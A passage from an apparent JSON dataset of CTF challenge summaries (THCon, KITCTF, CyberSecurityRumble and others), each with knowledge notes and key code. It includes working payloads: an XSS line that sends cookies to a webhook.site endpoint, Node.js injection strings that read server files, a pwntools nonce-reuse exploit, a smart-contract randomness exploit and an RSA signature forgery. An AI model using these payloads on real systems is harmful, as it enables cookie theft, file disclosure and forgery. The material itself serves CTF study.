contract.functions.gib_flag(100, 'evvixyvj vjm', pow(2, 256) - 1).call()\nprint(result)\n```\nReplace `<NODE_URL>`, `0xCONTRACT_ADDRESS`, and `[ABI]` with the actual values for your scenario. This code demonstrates how to call a contract's function without making a transaction (useful for view/pure functions)."
        ],
        "key": "```solidity\nfunction gib_flag(uint arg1, string memory arg2, uint arg3) public view returns (uint) {\n    require((arg1 ^ 0x70) == 20, \"Invalid arg1\");\n    require(decrypt(arg2) == \"offshift ftw\", \"Invalid arg2\");\n    require(arg3 > 0, \"arg3 must be greater than 0\");\n    require(arg3 + 1 < 1, \"Overflow check failed\");\n    // ... rest of the function\n}\n\nfunction decrypt(string memory input) internal pure returns (string memory) {\n    // Assembly code for decryption\n    // ...\n}\n```"
    },
    {
        "name": "CRAPSaaS",
        "write_up": "dataset/raw/CRAPSaaS.md",
        "type": "reverse",
        "competition": [
            "THCon/2021",
            "https://ctftime.org/event/1381/tasks/"
        ],
        "score": 498,
        "max_score": 500,
        "difficulty": 0.996,
        "knowledge": [
            "Vulnerabilities located in the syscall implementations of emulators can often lead to arbitrary read and write conditions. In this scenario, the overflow check for the `read` and `write` syscalls was insufficient, allowing for operations with extremely large size parameters after integer overflow. This could be abused to leak memory or crash the program. To exploit such vulnerabilities, it's crucial to understand the arithmetic and logic behind the checks and how they can be bypassed or manipulated for unintended behavior. A generic payload could involve manipulating parameters such as `r3` and `r4` to trigger an overflow and pass checks unexpectedly.",
            "When exploiting buffer overflow vulnerabilities in emulators or programs using memory access instructions (like `ldr` and `str`), the removal or manipulation of bounds checks can lead to out-of-bounds memory access. This challenge highlights the importance of carefully analyzing changes between versions of a target binary, as the removal of a bounds check for memory access instructions introduced a new vulnerability. This can lead to reading and writing arbitrary memory locations if the addresses can be controlled or predicted. A practical exploitation method involves crafting payloads that manipulate memory addresses to read/write out of the intended bounds, leveraging predictable memory layouts or offsets from `mmap` regions to other critical structures or code in memory (e.g., `libc`)."
        ],
        "key": "```c\n//write  \nif ((uint32_t)(r3 + r4) > 0x1fff) {  \n\texit(1);  \n}  \nchar* write_buf = malloc(r4);  \nmemcpy(write_buf, &memory[r3], r4);  \nr1 = write(r2, write_buf, r4);  \nfree(write_buf);\n\n//read  \nif ((uint32_t)(r3 + r4) > 0x1fff) {  \n\texit(1);  \n}  \nchar* read_buf = malloc(r4);  \nr1 = read(r2, read_buf, r4);  \nmemcpy(&memory[r3], read_buf, r1);  \nfree(read_buf);  \n\n// Instruction is either ldr or str  \nTMP = Rx + Vy;\n\nif (is_str) {  \n\tmemory[TMP] = Rz;  \n}  \nelse {  \n\tRz = memory[TMP];  \n}  \n```"
    },
    {
        "name": "CRAPSemu",
        "write_up": "dataset/raw/CRAPSemu.md",
        "type": "reverse",
        "competition": [
            "THCon/2021",
            "https://ctftime.org/event/1381/tasks/"
        ],
        "score": 493,
        "max_score": 500,
        "difficulty": 0.986,
        "knowledge": [
            "When facing challenges that require input validation bypass or cracking a password, timing side-channel attacks can be a viable initial approach if the validation checks the password character by character. This technique relies on measuring execution time for different input characters, where longer execution times may indicate a correct character due to additional processing. If direct timing measurement is not feasible or accurate due to the environment (e.g., virtual machines), using tools like Intel's Pin for tracking instruction counts could provide a more precise measurement by counting the number of instructions executed for each input character.",
            "For challenges involving encrypted or hidden flags within a program's operation, reversing the program logic is essential. If the flag is dynamically generated or encrypted and never fully appears in plaintext in memory, one must reverse engineer the program's logic to understand how the flag is processed or generated. This could include decrypting an encrypted memory block using known constants or operation patterns identified in the disassembled code. For example, if a program encrypts a correct password in memory and compares it against the user's input by decrypting chunks of the encrypted password using a specific operation (e.g., XOR with a known constant), reversing this operation with the known constant on the stored password chunks can reveal the plaintext password or flag.\n\nSample of decrypted payload (reverse operation):\n```c\n// If encrypted password is stored at 0x1ff and XORed with 0x1337f00d, decrypt like so:\nuint32_t encrypted_password[6]; // Assuming this holds the encrypted password from memory\nuint32_t decrypted_password[6];\nfor (int i = 0; i < 6; i++) {\n    decrypted_password[i] = encrypted_password[i] ^ 0x1337f00d;\n}\n// Convert decrypted_password[] to characters or string as needed.\n```"
        ],
        "key": "```c\nswitch(r1) {  \n   case 0: read(fd=r2, ptr=&memory[r3], size=r4); break;  \n   case 1: write(fd=r2, ptr=&memory[r3], size=r4); break;  \n   case 2: exit(status=r2);  \n   default: exit(status=1);  \n}  \n```"
    },
    {
        "name": "crccalc2",
        "write_up": "dataset/raw/crccalc2.md",
        "type": "crypto",
        "competition": [
            "ALLES/2020",
            "https://ctftime.org/event/1091/tasks/"
        ],
        "score": 313,
        "max_score": 500,
        "difficulty": 0.626,
        "knowledge": [
            "CRC (Cyclic Redundancy Check) algorithms are not cryptographically secure because they possess linear properties. Specifically, for any two inputs `x` and `y`, the property `CRC(x\u2295y) \u2295 CRC(0) = CRC(x) \u2295 CRC(y)` holds. This allows one to employ linear algebra techniques, such as setting up systems of equations in matrix form, to solve for unknown inputs given a set of CRC values. This approach is useful in scenarios where one needs to reverse-engineer or guess an input based on its CRC values. The technique is especially applicable when dealing with multiple CRCs of varying bit lengths, where the challenge involves finding an input that matches all given CRCs.",
            "The SageMath (or Sage) programming language can be utilized to perform calculations over GF(2) (Galois Field of two elements, representing binary arithmetic) for solving systems of linear equations derived from CRC calculations. This method involves converting CRC calculations into polynomial operations over GF(2), allowing for efficient manipulation and solving of equations. In practice, this involves defining CRC parameters (polynomials, initial and final XOR values, bit lengths, etc.), encoding the target CRCs into matrix form, and using linear algebra functions to find inputs that satisfy all CRC equations. This is demonstrated in the given Sage script, which automates the process of finding inputs matching a given set of CRC values by setting up and solving a system of linear equations. This approach is beneficial for cryptographic challenges that involve reverse-engineering inputs from their CRCs or when testing the resilience of systems against CRC-based manipulation.\n\nExample application (specific payload generation is abstract and depends on the challenge's target CRC values and expected input length):\n- Define target CRC values and input length.\n- Encode these into a system of linear equations using the mentioned linear properties of CRCs.\n- Use SageMath code similar to the provided script to solve for the unknown input."
        ],
        "key": "```python\ndef mycrc(name, bs):  \n   data = crcs[name]  \n   poly, bits, rev, ixor, oxor = data['poly'], data['bits'], data['rev'],\n   data['ixor'], data['oxor']  \n   if rev:  \n       bs = b''.join(bytes([(int('{:08b}'.format(x)[::-1],2))]) for x in bs)  \n   res = 0  \n   res = num2poly(ixor ^^ oxor)  \n   if rev:  \n       res = R(x**(bits-1) * res(1/x))  \n   res *= x**(8*len(bs))  \n   res += x**bits * num2poly(bytes_to_long(bs))  \n   res %= poly  \n   if rev:  \n       res = R(x**(bits-1) * res(1/x))  \n   res += num2poly(oxor)  \n   return poly2num(res)\n```"
    },
    {
        "name": "Crooked Roulette",
        "write_up": "dataset/raw/Crooked Roulette.md",
        "type": "crypto",
        "competition": [
            "KITCTFCTF/2022",
            "https://ctftime.org/event/1810/tasks/"
        ],
        "score": 451,
        "max_score": 500,
        "difficulty": 0.902,
        "knowledge": [
            "In challenges involving RSA signing without padding (Textbook RSA), a blinding attack can be utilized to trick the server into signing a modified version of the original message, which can then be unblinded to produce a valid signature for the original message. This attack exploits the multiplicative property of RSA. Specifically, if a server signs a modified message \\(m' = a^e \\cdot m \\mod n\\), obtaining the signature and then dividing it by \\(a\\) (for which \\(a^e\\) was chosen), yields the signature for the original message \\(m\\).",
            "To execute a blinding attack when the public exponent \\(e\\) is unknown, and only the modulus \\(n\\) is given, one can leverage the special property of \\(-1\\) modulo \\(n\\) (i.e., \\(n-1\\)). This involves asking the server to sign the product of the target message and \\(n-1\\) modulo \\(n\\), which effectively flips the sign of the original signature when \\(d\\) (the private exponent) is odd. This works under RSA because of the equivalence \\(a \\equiv -a \\mod n\\) for any integer \\(a\\), and given that RSA's decryption and encryption operations are inverse operations.\n   \n   Example payload for crafting and unblinding a signature:\n   ```python\n   n = int(input(\"Give me n\"), 16)  \n   result = int(input(\"Give me the result\"), 16)\n\n   # Crafting the blinded message\n   blinded_message = hex(((n-1) * result) % n)  \n   print(f\"Let the server sign this {blinded_message}\")  \n   sig = int(input(\"Signature: \"), 16)\n\n   # Unblinding the signature\n   forged_signature = hex((sig * pow(n-1, -1, n)) % n)  \n   print(f\"Forged signature: {forged_signature}\")  \n   ```"
        ],
        "key": "```python\n#!/usr/bin/env python3  \nfrom math import gcd  \nfrom Crypto.Util.number import getPrime,getRandomInteger\n\nflag = \"KITCTF{fake_flag}\"\n\np = getPrime(512)  \nq = getPrime(512)  \nn = p*q  \nphi = (p-1)*(q-1)  \ne = getPrime(256)  \nwhile gcd(e, phi) != 1:  \n   e = getPrime(256)\n\nd = pow(e, -1, phi)\n\ndef sign(m):  \n   return pow(m, d, n)\n\ndef check(c, m):  \n   return pow(c, e, n) == m\n\nresult = getRandomInteger(256)  \nprint(f\"Number of pockets: {hex(n)}\")  \nprint(f\"The Manager told me, the roulette is crooked and will hit\n{hex(result)}\")  \nbase = 16  \nm2 = int(input(f\"What should I bet? \"), base)  \nif m2 % n == result:  \n   print(\"It is too obvious if I bet that\")  \nelse:  \n   s2 = sign(m2)  \n   print(f\"My Signatur is {hex(s2)}\")  \n   message = int(input(f\"What do you want to bet? \"), base)  \n   signature = int(input(f\"Please sign your bet \"), base)  \n   if result == message and check(signature, message):  \n       print(f\"You Win: {flag}\")  \n   else:  \n       print(\"You Lose\")  \n```"
    },
    {
        "name": "cross-site-python",
        "write_up": "dataset/raw/cross-site-python.md",
        "type": "web",
        "competition": [
            "KITCTFCTF/2023",
            "https://ctftime.org/event/1965/tasks/"
        ],
        "score": 345,
        "max_score": 1000,
        "difficulty": 0.345,
        "knowledge": [
            "When facing restrictions due to Content-Security-Policy (CSP) that limits JavaScript execution to script sources from 'self' and even if traditional XSS vectors like \"script\", \"img\", or event handlers (e.g., \"onerror\") are filtered out server-side, explore the environment for alternative execution methods such as utilizing web-based Python execution platforms (e.g., PyScript). This approach requires bypassing blacklisted elements by leveraging internal objects or methods that are not explicitly filtered and can interact with the DOM or perform web requests. Example payload for extracting sensitive information through an unfiltered class method in PyScript:\n```python\nbut = dict.__base__.__subclasses__()[363](\"buttons\")\nbut.element.innerHTML = '![](https://webhook.site/YOUR_UNIQUE_ENDPOINT?' + but.element.ownerDocument.cookie + ')'\n```",
            "Utilize external services such as webhook.site to capture data exfiltrated from XSS payloads. This method is particularly useful when direct payload feedback isn't possible within the challenge environment and is a viable strategy for bypassing strong CSP policies when coupled with unconventional XSS vectors that leverage the application's allowed functionalities or overlooked object properties/methods. Preparing a webhook receiver allows the collection of sensitive data (e.g., session cookies) relayed by specially crafted payloads without directly violating CSP rules."
        ],
        "key": "```python\n@app.route('/<code_id>/exec')  \ndef code_page(code_id):  \n   if code_id not in projects.keys():  \n       abort(404)\n\n   code = projects.get(code_id)\n\n   # Genius filter to prevent xss  \n   blacklist = [\"script\", \"img\", \"onerror\", \"alert\"]  \n   for word in blacklist:  \n       if word in code:  \n           # XSS attempt detected!  \n           abort(403)\n\n   res = make_response(render_template(\"code.html\", code=code))  \n   return res  \n```"
    },
    {
        "name": "CRYMEPLX",
        "write_up": "dataset/raw/CRYMEPLX.md",
        "type": "crypto",
        "competition": [
            "CyberSecurityRumble/2022",
            "https://ctftime.org/event/1665/tasks/"
        ],
        "score": 100,
        "max_score": 960,
        "difficulty": 0.10416666666666667,
        "knowledge": [
            "When encountering a service that uses AES-CTR-128 mode (or any stream cipher mode) for encryption, if the Nonce (Number used once) is reused across different encryptions, one can exploit this by xoring the ciphertext of known input with the ciphertext of the unknown data (e.g., the flag) and the known input itself. This leverages the fact that the keystream (AES(Key, Nonce)) remains the same, allowing for the decryption of the flag if one can control the input and obtain the ciphertext of both the input and the flag.",
            "To perform the exploitation of reused Nonce vulnerabilities in AES-CTR or similar encryption schemes, construct an exploit that sends a user-controlled input to the service, retrieves the encrypted outputs of both the fixed secret (like a flag) and the controlled input, and then xors these ciphertexts with the input. This method directly applies to scenarios where the encryption key and Nonce are not changing between encryption operations.\n    - Example of constructing an exploit in Python using the `pwntools` library:  \n    ```python\n    from pwn import *  \n    import binascii\n\n    p = remote('target.host', port)\n\n    # Receive encrypted flag\n    enc_flag = binascii.unhexlify(p.recvline().strip())  \n    \n    # Send controlled input\n    input = 'A' * len(enc_flag)  \n    p.sendline(input)  \n    \n    # Receive encryption of input\n    enc_input = binascii.unhexlify(p.recvline().strip())  \n\n    # Decrypt flag\n    flag = xor(input.encode(), enc_input, enc_flag)  \n    print(f'Decrypted flag: {flag}')\n    ```"
        ],
        "key": "```python  \nfrom Crypto.Cipher import AES  \nfrom secret import flag  \nimport os\n\nkwargs = {\"nonce\": os.urandom(8)}  \nkey = os.urandom(16)\n\ndef encrypt(msg):  \n   aes = AES.new(key, AES.MODE_CTR, **kwargs)  \n   return aes.encrypt(msg).hex()\n\nprint(encrypt(flag))  \nq = input(\"Encrypt this string:\").encode()  \nprint(encrypt(q))  \n```"
    },
    {
        "name": "crypto 01",
        "write_up": "dataset/raw/crypto 01.md",
        "type": "crypto",
        "competition": [
            "WhiteHat/2018/Quals",
            "https://ctftime.org/event/656/tasks/"
        ],
        "score": 380,
        "max_score": 420,
        "difficulty": 0.9047619047619048,
        "knowledge": [
            "In scenarios involving stream ciphers where encryption is based on a key and a static parameter (like timestamp), if the static parameter does not change frequently (as in, it remains constant for a duration), the keystream generated for that period stays constant. This property can be exploited to recover the keystream by XORing a known plaintext message with the corresponding ciphertext. This method requires that the communication leverages a constant parameter (e.g., timestamp) and that both the plaintext message and its length are known.",
            "Knowing how stream ciphers operate, particularly in cases where parameters like timestamps are used for generating keystreams, one can craft and send messages encrypted with previously recovered keystreams. This is feasible even after the encryption key on the server side changes, as long as the parameter (e.g., timestamp) used in the keystream generation remains the same. This methodology allows for encrypted communications to be forged or manipulated without the need to directly crack or bypass the encryption key."
        ],
        "key": "```c\nbool A51Comm::send_raw_hex(const std::string& data)  \n{  \n   std::cout<<\"========================== SEND RAW START ==========================\"<<\"\\n\";  \n   timestamp = partnerTimestamp;  \n\tuint64_t dataLength = data.length()/2;  \n   std::cout << \"timestamp: \" << timestamp << \"\\n\";  \n   std::cout << \"data-length: \" << dataLength << '\\n';  \n\tconst char* payload = hex_to_string(data).c_str();  \n\t// send in form: p64(timestamp) + p64(data-length) + encrypted  \n\twrite(fdOut, &timestamp, 8);  \n\twrite(fdOut, &dataLength, 8);  \n\twrite(fdOut, payload, dataLength);  \n   std::cout<<\"========================== SEND RAW END ==========================\"<<\"\\n\";  \n\treturn true;  \n}  \n```"
    },
    {
        "name": "crypto casino",
        "write_up": "dataset/raw/crypto casino.md",
        "type": "crypto",
        "competition": [
            "0x41414141/2021",
            "https://ctftime.org/event/1249/tasks/"
        ],
        "score": 487,
        "max_score": 1000,
        "difficulty": 0.487,
        "knowledge": [
            "When interacting with smart contracts on the Ethereum blockchain, especially for tasks that require precise timing like betting in a game, one can determine the expected outcome based on the block number at the time of transaction plus one (since the transaction will be included in the next block). This can be useful in scenarios where the contract's behavior is deterministic and depends on the block number. For this, encoding the current block number plus one along with a known seed, hashing it, and performing bitwise operations (like XOR) can match the contract's expected value to win a bet.\n\n   - Scenario: Determining the outcome of a decentralized casino game where the result depends on the block number.\n   - Knowledge: To predict outcomes dependent on block numbers, encode and hash the seed with the next block number, then apply any bitwise operations as done by the contract to calculate the expected result.\n\n   Example Payload:\n   ```python\n   seed = w3.solidityKeccak(['string'], ['some_known_seed'])\n   next_block_guess = encode_abi_packed(['bytes', 'uint256'], (seed, w3.eth.block_number() + 1))\n   next_block_guess_hashed = w3.solidityKeccak(['bytes'], [next_block_guess])\n   guess = int(next_block_guess_hashed.hex(), 16) ^ 0xSOME_BITWISE_VALUE\n   ```",
            "In solidity contracts that implement PRNG (Pseudo-random number generation) using block properties like `blockhash`, an exploitable flaw occurs if the contract's randomness can be predicted or replicated by an external contract. Creating an external contract to simulate the PRNG function of the target contract (e.g., a casino game) allows one to predict or ensure desired outcomes for probabilistic actions, like betting. \n\n   - Scenario: Exploiting weak randomness in smart contract functions that use `blockhash` for randomness.\n   - Knowledge: To exploit weak PRNG in contracts, replicate the contract's randomness generation logic in an external contract to predict outcomes or revert undesired transactions.\n\n   Example Payload:\n   ```solidity\n   contract Exploit {\n       function _randomNumber() public view returns(uint8) {\n           uint256 ab = uint256(blockhash(block.number - 1));\n           uint256 a = ab & 0xffffffff;\n           uint256 b = (ab >> 32) & 0xffffffff;\n           uint256 x = uint256(blockhash(block.number));\n           return uint8((a * x + b) % 6); // Assuming the random number is used for a 1/6 chance event\n       }\n\n       function exploit(address _casino, uint256 _amount) public {\n           require(_randomNumber() == 0, \"Wait for the next block\");\n           Casino(_casino).bet(_amount);\n       }\n   }\n   ```"
        ],
        "key": "```solidity  \n//SPDX-License-Identifier: Unlicensed  \npragma solidity ^0.8.0;\n\nimport \"./DUCoin.sol\";  \nimport \"OpenZeppelin/[email\u00a0protected]/contracts/access/Ownable.sol\";\n\ncontract Casino is Ownable {  \n   DUCoin public immutable ducoin;\n\n   bool trialed = false;  \n   uint256 lastPlayed = 0;  \n   mapping(address => uint256) public balances;\n\n   constructor(address token) {  \n       ducoin = DUCoin(token);  \n   }\n\n   function deposit(uint256 amount) external {  \n       ducoin.transferFrom(msg.sender, address(this), amount);  \n       balances[msg.sender] += amount;  \n   }\n\n   function withdraw(uint256 amount) external {  \n       require(balances[msg.sender] >= amount, \"Insufficient balance!\");  \n       ducoin.transfer(msg.sender, amount);  \n       balances[msg.sender] -= amount;  \n   }\n\n   function _randomNumber() internal view returns(uint8) {  \n       uint256 ab = uint256(blockhash(block.number - 1));  \n       uint256 a = ab & 0xffffffff;  \n       uint256 b = (ab >> 32) & 0xffffffff;  \n       uint256 x = uint256(blockhash(block.number));  \n       return uint8((a * x + b) % 6);  \n   }\n\n   function play(uint256 bet) external {  \n       require(balances[msg.sender] >= bet, \"Insufficient balance!\");  \n       require(block.number > lastPlayed, \"Too fast!\");  \n       lastPlayed = block.number;\n\n       uint8 roll = _randomNumber();  \n       if(roll == 0) {  \n           balances[msg.sender] += bet;  \n       } else {  \n           balances[msg.sender] -= bet;  \n       }  \n   }\n\n   function getTrialCoins() external {  \n       if(!trialed) {  \n           trialed = true;  \n           ducoin.transfer(msg.sender, 7);  \n       }  \n   }  \n}  \n```"
    },
    {
        "name": "Crypto Crossword",
        "write_up": "dataset/raw/Crypto Crossword.md",
        "type": "crypto",
        "competition": [
            "b01lers/2020",
            "https://ctftime.org/event/974/tasks/"
        ],
        "score": 200,
        "max_score": 300,
        "difficulty": 0.6666666666666666,
        "knowledge": [
            "When encountering obfuscated or encoded strings, various decoding techniques should be tested based on the appearance of the string. For instance:\n   - If a string ends in '=', Base64 decoding is likely applicable.\n   - If the string consists of two symbols or looks binary, consider Morse code with appropriate symbol mapping.\n   - For hexadecimal strings, direct conversion to text might yield meaningful information.\n   - Ascii85 encoding should be suspected when encountering strings with a wide range of characters, including punctuation and special characters.\n   - Substitution ciphers, including ROT13, should be applied to strings that maintain sentence structure.",
            "In challenges involving ciphers, clues may not directly indicate the cipher used. External hints or broader research (like referencing external media provided as hints) may be necessary to identify the encryption or encoding method, such as Hill ciphers. \n   - For example, with Hill cipher challenges, once the encoded message is identified, one must construct a matrix based on the challenge's constraints (like a crossword layout) and then map letters to numbers (typically A=0, B=1, ..., Z=25) before proceeding with decryption."
        ],
        "key": "```python\ndef vulnerable_function(input_data):\n    # This function simulates a simple Hill cipher encryption\n    # with a fixed key matrix that could be vulnerable to known-plaintext attacks.\n    key_matrix = [[6, 24, 1], [13, 16, 10], [20, 17, 15]]\n    input_vector = [ord(char) - ord('A') for char in input_data.upper()]\n    \n    # Ensure the input vector is of length 3 for simplicity\n    if len(input_vector) != 3:\n        raise ValueError(\"Input data must be exactly 3 characters long.\")\n    \n    # Perform matrix multiplication\n    encrypted_vector = [\n        sum(key_matrix[i][j] * input_vector[j] for j in range(3)) % 26\n        for i in range(3)\n    ]\n    \n    # Convert back to characters\n    encrypted_data = ''.join(chr(num + ord('A')) for num in encrypted_vector)\n    return encrypted_data\n\n# Example usage\nplaintext = \"ACT\"\nciphertext = vulnerable_function(plaintext)\nprint(f\"Encrypted: {ciphertext}\")\n```\n"
    },
    {
        "name": "Crypto Party",
        "write_up": "dataset/raw/Crypto Party.md",
        "type": "crypto",
        "competition": [
            "LedgerDonjon/2021",
            "https://ctftime.org/event/1516/tasks/"
        ],
        "score": 200,
        "max_score": 400,
        "difficulty": 0.5,
        "knowledge": [
            "When dealing with obfuscated code in mobile applications, especially for APKs, using an online decompiler can transform the APK into readable Java code. Despite the obfuscation of package and class names, searching for key functionalities related to the application's main features (such as QR code processing in this case) can guide you to potentially vulnerable pieces of code. It is essential to focus on the logic related to specific functionalities to uncover vulnerabilities or understand how the app interacts with external services or APIs.",
            "In scenarios involving cryptographic operations, particularly where data is obfuscated or encrypted with a known key or pattern (e.g., XOR encryption with a static key), reversing the obfuscation or decryption process is possible by re-implementing the cryptographic method. This technique can reveal hidden URLs, special values, or other sensitive data embedded within the application. For example, XORing obfuscated byte arrays with the known key \"android.permission.CAMERA\" can deobfuscate URLs or special QR code values, enabling further exploration or exploitation.\n\nExample Payload for XOR Deobfuscation:\n```python\ndef deobfuscate(s):\n    key = b'android.permission.CAMERA'\n    return bytes([s[i] ^ key[i % len(key)] for i in range(len(s))])\n```\n\nThis payload can deobfuscate data obfuscated with the XOR method using a static key, revealing hidden information for further analysis or exploitation steps in CTF challenges."
        ],
        "key": "```java\npublic class b {\n    public static HostnameVerifier a() {\n        return new a();\n    }\n\n    public class a implements HostnameVerifier {\n        public boolean verify(String hostname, SSLSession session) {\n            return true;\n        }\n    }\n\n    public static SSLSocketFactory c() {\n        try {\n            TrustManager[] trustAllCerts = {new C0051b()};\n            SSLContext sslContext = SSLContext.getInstance(\"SSL\");\n            sslContext.init((KeyManager[]) null, trustAllCerts, new SecureRandom());\n            return sslContext.getSocketFactory();\n        } catch (KeyManagementException | NoSuchAlgorithmException e) {\n            return null;\n        }\n    }\n\n    public class C0051b implements X509TrustManager {\n        public void checkClientTrusted(X509Certificate[] chain, String authType) {\n        }\n\n        public void checkServerTrusted(X509Certificate[] chain, String authType) {\n        }\n\n        public X509Certificate[] getAcceptedIssuers() {\n            return new X509Certificate[0];\n        }\n    }\n}\n```"
    },
    {
        "name": "Crypto PHP",
        "write_up": "dataset/raw/Crypto PHP.md",
        "type": "crypto",
        "competition": [
            "RaziCTF/2020",
            "https://ctftime.org/event/1167/tasks/"
        ],
        "score": 990,
        "max_score": 996,
        "difficulty": 0.9939759036144579,
        "knowledge": [
            "When handling web challenges involving custom cryptographic functions for address validation, carefully examine the conversion process implemented in the script from one numeral system to another. In this scenario, a Bitcoin address is processed through a series of conversions: first from base58 to decimal, then from decimal to hexadecimal. This understanding can guide the construction of a valid address that bypasses the check, especially when specific starting characters are required for the address. This process involves mathematical manipulations and understanding of numeral systems which are common in cryptographic challenges.",
            "The presence of arbitrary precision arithmetic operations (e.g., using `bcmath` in PHP) in cryptographic validation scripts suggests that precision matters significantly in the calculation. This means for a challenge, one may need to replicate the process with high precision in their scripting language of choice (for example, Python's `Fraction` module to maintain precision during decimal to hexadecimal conversion). This highlights the importance of choosing the right tools or libraries that can handle large numbers accurately when trying to forge or manipulate cryptographic strings or addresses.\n\nExample payload or address manipulation is not directly provided due to the complexity and specificity of the operation (involving conversion from base58 to decimal to hexadecimal and ensuring certain conditions like address length and starting characters are met). However, understanding the process detailed in the write-up allows for crafting a valid address given the conditions provided."
        ],
        "key": "```php\n<?php\n\nfunction checkAddress($address)\n{\n    $origbase58 = $address;\n    $dec = \"0\";\n\n    for ($i = 0; $i < strlen($address); $i++)\n    {\n        $dec = bcadd(bcmul($dec,\"58\",0),strpos(\"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz\",substr($address,$i,1)),0);\n    }\n\n    $address = \"\";\n\n    while (bccomp($dec,0) == 1)\n    {\n        $dv = bcdiv($dec,\"16\",0);\n        $rem = (integer)bcmod($dec,\"16\");\n        $dec = $dv;\n        $address = $address.substr(\"0123456789ABCDEF\",$rem,1);\n    }\n\n    $address = strrev($address);\n\n    for ($i = 0; $i < strlen($origbase58) && substr($origbase58,$i,1) == \"1\"; $i++)\n    {\n        $address = \"00\".$address;\n    }\n\n    if (strlen($address)%2 != 0)\n    {\n        $address = \"0\".$address;\n    }\n\n    if (strlen($address) != 50)\n    {\n        return false;\n    }\n\n    if (hexdec(substr($address,0,2)) > 0)\n    {\n        return false;\n    }\n\n    return substr(strtoupper(hash(\"sha256\",hash(\"sha256\",pack(\"H*\",substr($address,0,strlen($address)-8)),true))),0,8) == substr($address,strlen($address)-8);\n}\n\n$address = \"35hK24tcLEWcgNA4JxpvbkNkoAcDGqQPsP\";\nif (isset ($_GET[\"PleaseCreateABitcoinAddressForMe\"]))\n{\n$address = $_GET[\"PleaseCreateABitcoinAddressForMe\"];\n}\n\n$check = checkAddress($address);\nif ($check)\n{\n\tif (substr( $address, 0, 5 ) === \"1Razi\")\n\t{\n\t\techo \"flag\";\n\t}\n}\nelse\n{\n\techo \"I'm not giving you any flags!\";\n}\n\necho $check;\n\n?> \n```"
    },
    {
        "name": "crypto valentine day",
        "write_up": "dataset/raw/crypto valentine day.md",
        "type": "crypto",
        "competition": [
            "LA/2024",
            "https://ctftime.org/event/2102/tasks/"
        ],
        "score": 195,
        "max_score": 499,
        "difficulty": 0.3907815631262525,
        "knowledge": [
            "In a challenge involving decryption with the Vigen\u00e8re cipher, if a portion of the plaintext is known and the key is long, you can determine a section of the key by comparing the known plaintext to the ciphertext. This procedure involves calculating the difference between the ASCII values of the ciphertext characters and the corresponding plaintext characters, then applying a modulo operation to deal with the cyclic nature of the alphabet. This process can be automated with a script to expedite the decryption process.  \nExample Python code snippet:  \n   ```python\n   key = []  \n   for i in range(len(plaintext)):  \n       if (plaintext[i] >= ord('a') and plaintext[i] <= ord('z')) or (plaintext[i] >= ord('A') and plaintext[i] <= ord('Z')):  \n           key.append((ciphertext[i]-plaintext[i] + 26) % 26)\n   ```",
            "When the Vigen\u00e8re cipher key is partially known and not sufficient to decrypt the entire ciphertext, extend the known part of the key to match the expected key length by padding it. This action won't necessarily decrypt the whole text correctly but might decrypt enough of it to retrieve useful information or the flag, as the key repeats over the length of the message. This strategy is particularly effective if the challenge hints that not the entire key is needed or if the key is significantly long, making a brute-force approach infeasible.  \nExample Python code snippet to extend the key:  \n   ```python\n   key.extend([0]*(expected_key_length-len(key)))\n   ```"
        ],
        "key": "```python  \nct = open(\"ct.txt\", \"rb\").read()  \nt  = open(\"intro.txt\", \"rb\").read()\n\nkey = []  \nfor i in range(len(t)):  \n   if (t[i] >= ord('a') and t[i] <= ord('z')) or (t[i] >= ord('A') and t[i] <= ord('Z')):  \n       key.append((ct[i]-t[i] + 26) % 26)\n\nkey.extend([0]*(161-len(key)))\n\nfor c in key: print(chr(c+ord('a')), end=\"\")  \n```\n\n```python  \nindex = 0  \nfor c in ct:  \n   offset = 0  \n   if (c >= ord('a') and c <= ord('z')):  \n       offset = ord('a')  \n   elif (c >= ord('A') and c <= ord('Z')):  \n       offset = ord('A')  \n   else:  \n       print(chr(c), end=\"\")  \n       continue\n\n   c = ((((c - offset) - key[index%len(key)]) + 26) % 26) + offset  \n   index += 1  \n   print(chr(c), end=\"\")  \n```"
    },
    {
        "name": "CSRegex",
        "write_up": "dataset/raw/CSRegex.md",
        "type": "pwn",
        "competition": [
            "CyberSecurityRumble/2020",
            "https://ctftime.org/event/1057/tasks/"
        ],
        "score": 100,
        "max_score": 1337,
        "difficulty": 0.07479431563201197,
        "knowledge": [
            "When dealing with a server-side JavaScript environment (such as Node.js) that does not initially allow access to the `require` function, bypass this limitation by accessing global objects or modules through `process.mainModule.require`. This technique can be particularly useful for CTF challenges that require reading files or executing server-side commands without direct access to Node.js core modules. \n   - Example payload to list files in the current directory: `z'.match()/gi);let files = [];const fs = process.mainModule.require('fs'); fs.readdirSync(\".\").forEach(file =>  files.push(file) ); return files;/`",
            "To extract sensitive information or find flags in a server-side JavaScript environment without direct access to command execution or restricted modules, leverage filesystem modules (such as `fs`) to read files that might contain sensitive data, including configuration files, source codes, and even hidden or obfuscated files that contain flags.\n   - Example payload to read the content of a file (e.g., `api.js`): `z'.match()/gi);const fs = process.mainModule.require('fs'); const data = fs.readFileSync('api.js', 'utf8'); return(data);/`"
        ],
        "key": "```js\n//code:  \nlet files = [];  \nconst fs = process.mainModule.require('fs');  \nfs.readdirSync(\".\").forEach(file => files.push(file) );  \nreturn files;\n\n// exploit:  \nz'.match()/gi);let files = [];const fs = process.mainModule.require('fs');\nfs.readdirSync(\".\").forEach(file =>  files.push(file) ); return files;/\n\n// code:  \nconst fs = process.mainModule.require('fs');  \nconst data = fs.readFileSync('api.js', 'utf8');  \nreturn(data);/\n\n// exploit:  \nz'.match()/gi);const fs = process.mainModule.require('fs'); const data =\nfs.readFileSync('dockerfile', 'utf8'); return(data);/\n```"
    },
    {
        "name": "ctfhub2",
        "write_up": "dataset/raw/ctfhub2.md",
        "type": "misc",
        "competition": [
            "N1CTF/2021",
            "https://ctftime.org/event/1367/tasks/"
        ],
        "score": 1000,
        "max_score": 1000,
        "difficulty": 1.0,
        "knowledge": [
            "When interacting with custom encryption functions that take input and output buffers along with their sizes, it\u2019s critical to verify the buffer lengths to prevent potential overflow. If the encryption function lacks checks for the output buffer size, it can lead to buffer overflow vulnerabilities given that the size of the output buffer is not appropriately validated against the size of the input. This scenario is more likely when each input byte translates to a larger number of bytes in the output buffer, highlighting the need for careful management of buffer sizes in encryption routines.",
